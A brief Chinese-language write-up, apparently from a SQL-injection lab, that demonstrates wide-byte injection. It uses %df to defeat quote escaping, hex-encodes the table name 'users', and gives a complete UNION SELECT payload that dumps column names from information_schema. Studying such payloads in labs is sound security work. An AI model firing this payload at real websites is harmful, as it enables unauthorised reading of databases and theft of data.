宽字节注入。

测试单双引号，括号都无报错。



目测为宽字节注入。



```
?id=99%df'  用%df来绕过
```



 users 用16进制编码

```
0x7573657273
```



payload

```
?id=99%df%27union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=0x7573657273--+
```

